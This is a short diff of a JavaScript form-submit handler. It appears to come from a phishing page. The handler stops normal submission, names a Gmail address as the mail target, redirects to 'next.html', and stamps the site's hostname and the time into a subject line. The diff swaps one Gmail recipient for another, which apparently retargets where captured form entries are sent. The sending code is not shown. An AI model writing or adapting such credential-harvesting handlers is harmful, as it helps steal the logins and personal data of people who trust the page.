@@ -1,7 +1,7 @@
 let e = document.querySelector('form')
 e.addEventListener('submit', t)
 function t () {
-  mail = 'codenew39@gmail.com'
+  mail = 'demalaigboran@gmail.com'
   event.preventDefault()
   next = 'next.html'
   subject = `${window.location.hostname} ${new Date()}`
